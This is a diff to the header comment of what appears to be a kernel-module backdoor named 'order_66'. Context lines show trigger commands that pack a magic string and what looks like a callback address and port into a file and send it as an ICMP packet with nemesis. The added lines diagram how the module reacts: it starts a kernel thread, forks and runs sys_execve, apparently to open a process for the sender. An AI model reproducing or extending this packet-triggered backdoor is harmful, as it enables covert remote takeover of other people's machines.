@@ -58,7 +58,30 @@
  * From anywhere: # echo "z4xX0n" > /tmp/payload
  *                # perl -e 'print "\xfa\x01\xa8\xc0\x15\xb3"' >> /tmp/payload
  *                # nemesis icmp -i 5 -c 3 -P /tmp/payload -D 192.168.1.123
- */
+ *
+ *
+ * Design:
+ *
+ * icmp_input_order_66()
+ *        |
+ *    kthread_start()--------
+ *        |                 |
+ *    return            order_66()
+ *                          |
+ *                         create_order_66()
+ *                          |     |
+ *                          |   fork1()
+ *                          |     |
+ *                          |   cpu_fork_kthread_handler()------
+ *                          |                                  |
+ *                          |                             start_order_66()
+ *                          |                                  |
+ *                          |                                sys_execve()
+ *                         kick_order_66()
+ *                          |
+ *                         kthread_exit()
+ *                       
+ */   
 
 #define KLD_NAME T_NAME"_order_66"
 #define KLD_FILE_NAME T_NAME"_order_66.ko"
